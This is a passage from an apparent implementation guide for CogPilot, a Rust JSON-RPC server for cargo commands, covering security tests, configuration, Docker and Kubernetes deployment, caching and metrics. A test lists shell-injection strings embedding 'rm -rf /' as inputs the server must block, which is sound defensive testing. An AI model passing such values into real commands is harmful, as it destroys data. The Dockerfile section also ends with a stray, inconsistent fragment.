            "package`rm -rf /`",
            "package$(rm -rf /)",
        ];

        for injection in injection_attempts {
            let request = serde_json::json!({
                "jsonrpc": "2.0",
                "method": "cargo_add",
                "params": {
                    "package": injection
                },
                "id": 1
            });

            let response = server.handle_request(request).await;

            assert!(response["error"].is_object(), "Failed to block injection: {}", injection);
            assert_eq!(response["error"]["code"].as_i64().unwrap(), -32007);
        }
    }

    #[tokio::test]
    async fn test_resource_limit_enforcement() {
        let server = create_test_server_with_default_config().await;

        // Test memory limit
        let request = serde_json::json!({
            "jsonrpc": "2.0",
            "method": "cargo_build",
            "params": {
                "features": vec!["memory-intensive-feature"; 10000]
            },
            "id": 1
        });

        let response = server.handle_request(request).await;

        // Should either succeed within limits or fail with resource limit error
        if response["error"].is_object() {
            assert_eq!(response["error"]["code"].as_i64().unwrap(), -32002);
        }
    }
}
```

## Deployment Guidelines

### Cross-Platform Deployment

**Target Platforms**:

- Windows 10/11 (x64)
- Linux (x64) - Ubuntu 20.04+, CentOS 7+, Debian 10+

**Deployment Methods**:

1. **Standalone Executable**: Single binary with embedded dependencies
2. **Docker Container**: Containerized deployment for consistency
3. **Package Distribution**: Platform-specific packages (MSI, DEB, RPM)

### Local Configuration

**File**: `configs/local.toml`

```toml
[server]
host = "127.0.0.1"        # Localhost only
port = 8080
max_connections = 10      # Limited for local use
timeout = "30s"

[security]
localhost_only = true     # Enforce localhost binding
max_execution_time = 300
max_memory_mb = 512       # Reduced memory limit
max_disk_io_mb = 256      # Reduced disk limit
max_processes = 25        # Reduced process limit
osv_api_url = "https://api.osv.dev"
allowed_registries = ["crates.io"]

[tools]
cargo_path = "cargo"      # Use system PATH
rustc_path = "rustc"      # Use system PATH
git_path = "git"          # Use system PATH

[logging]
level = "info"
format = "json"
output = "cogpilot.log"   # Local file
max_size = "10MB"         # Reduced log size
max_files = 3

[monitoring]
metrics_enabled = false   # Disabled for local use
health_checks = true
```

### Cross-Platform Build

**Build Configuration**:

```toml
# Cargo.toml
[package]
name = "cogpilot"
version = "0.1.0"
edition = "2021"

[dependencies]
# Core dependencies
tokio = { version = "1.0", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
clap = { version = "4.0", features = ["derive"] }

# Platform-specific dependencies
[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = ["winuser", "processthreadsapi"] }

[target.'cfg(unix)'.dependencies]
libc = "0.2"
nix = "0.27"

# Build settings
[profile.release]
lto = true
codegen-units = 1
panic = "abort"
```

**Build Scripts**:

```bash
#!/bin/bash
# build.sh - Cross-platform build script

# Windows build
cross build --target x86_64-pc-windows-gnu --release

# Linux build
cross build --target x86_64-unknown-linux-gnu --release

# Package builds
cargo deb --target x86_64-unknown-linux-gnu
cargo generate-rpm --target x86_64-unknown-linux-gnu
```

### Docker Deployment

**File**: `Dockerfile`

```dockerfile
# Multi-stage build for efficiency
FROM rust:1.70-slim as builder

WORKDIR /app
COPY Cargo.toml Cargo.lock ./
COPY src ./src
RUN cargo build --release --target x86_64-unknown-linux-gnu

FROM debian:bullseye-slim

RUN apt-get update && apt-get install -y \
    ca-certificates \
    curl \
    git \
    && rm -rf /var/lib/apt/lists/*

# Install Rust and Cargo (minimal installation)
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain 1.70 --profile minimal
ENV PATH="/root/.cargo/bin:${PATH}"

# Install required tools
RUN cargo install cargo-audit cargo-deny cargo-llvm-cov cargo-mutants cargo-nextest

COPY --from=builder /app/target/x86_64-unknown-linux-gnu/release/cogpilot /usr/local/bin/
COPY configs/local.toml /etc/cogpilot/config.toml

# Create non-root user
RUN useradd -m -u 1000 cogpilot
USER cogpilot

# Expose localhost port only
EXPOSE 8080

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
  CMD curl -f http://localhost:8080/health || exit 1

CMD ["cogpilot", "--config", "/etc/cogpilot/config.toml"]
```

EXPOSE 8080 9090

USER 1000:1000

CMD ["cog_pilot", "--config", "/etc/cog_pilot/config.toml"]

```

### Kubernetes Deployment

**File**: `deploy/kubernetes.yaml`

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cog-pilot
  labels:
    app: cog-pilot
spec:
  replicas: 3
  selector:
    matchLabels:
      app: cog-pilot
  template:
    metadata:
      labels:
        app: cog-pilot
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
      containers:
      - name: cog-pilot
        image: cog-pilot:latest
        ports:
        - containerPort: 8080
        - containerPort: 9090
        env:
        - name: RUST_LOG
          value: "info"
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        volumeMounts:
        - name: config
          mountPath: /etc/cog_pilot
          readOnly: true
        - name: tmp
          mountPath: /tmp
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
      volumes:
      - name: config
        configMap:
          name: cog-pilot-config
      - name: tmp
        emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: cog-pilot
spec:
  selector:
    app: cog-pilot
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  - name: metrics
    port: 9090
    targetPort: 9090
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: cog-pilot-config
data:
  config.toml: |
    [server]
    host = "0.0.0.0"
    port = 8080

    [security]
    max_execution_time = 300
    max_memory_mb = 2048
    max_disk_io_mb = 1024

    [logging]
    level = "info"
    format = "json"
```

## Performance Optimization

### Caching Strategy

**File**: `src/utils/cache.rs`

```rust
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;

#[derive(Debug, Clone)]
pub struct CacheEntry<T> {
    pub value: T,
    pub expires_at: Instant,
}

pub struct Cache<T> {
    store: RwLock<HashMap<String, CacheEntry<T>>>,
    default_ttl: Duration,
}

impl<T: Clone> Cache<T> {
    pub fn new(default_ttl: Duration) -> Self {
        Self {
            store: RwLock::new(HashMap::new()),
            default_ttl,
        }
    }

    pub async fn get(&self, key: &str) -> Option<T> {
        let store = self.store.read().await;

        if let Some(entry) = store.get(key) {
            if Instant::now() < entry.expires_at {
                return Some(entry.value.clone());
            }
        }

        None
    }

    pub async fn set(&self, key: String, value: T, ttl: Option<Duration>) -> Result<(), CacheError> {
        let mut store = self.store.write().await;

        let expires_at = Instant::now() + ttl.unwrap_or(self.default_ttl);

        store.insert(key, CacheEntry { value, expires_at });

        Ok(())
    }

    pub async fn cleanup_expired(&self) {
        let mut store = self.store.write().await;
        let now = Instant::now();

        store.retain(|_, entry| now < entry.expires_at);
    }
}
```

## Monitoring and Observability

### Metrics Collection

**File**: `src/utils/metrics.rs`

```rust
use metrics::{counter, histogram, gauge};
use std::time::Instant;

pub struct MetricsCollector;

impl MetricsCollector {
    pub fn record_command_execution(command: &str, duration: f64, success: bool) {
        histogram!("command_execution_duration_seconds", duration, "command" => command.to_string());
        counter!("command_executions_total", "command" => command.to_string(), "success" => success.to_string());
    }

    pub fn record_security_violation(violation_type: &str) {
        counter!("security_violations_total", "type" => violation_type.to_string());
    }

    pub fn record_resource_usage(cpu_usage: f64, memory_usage: f64) {
        gauge!("cpu_usage_percent", cpu_usage);
        gauge!("memory_usage_bytes", memory_usage);
    }

    pub fn record_cache_hit(cache_type: &str, hit: bool) {
        counter!("cache_operations_total", "type" => cache_type.to_string(), "hit" => hit.to_string());
    }
}
```

This implementation guide provides a comprehensive foundation for building CogPilot with security-first principles, comprehensive testing, and production-ready deployment capabilities.
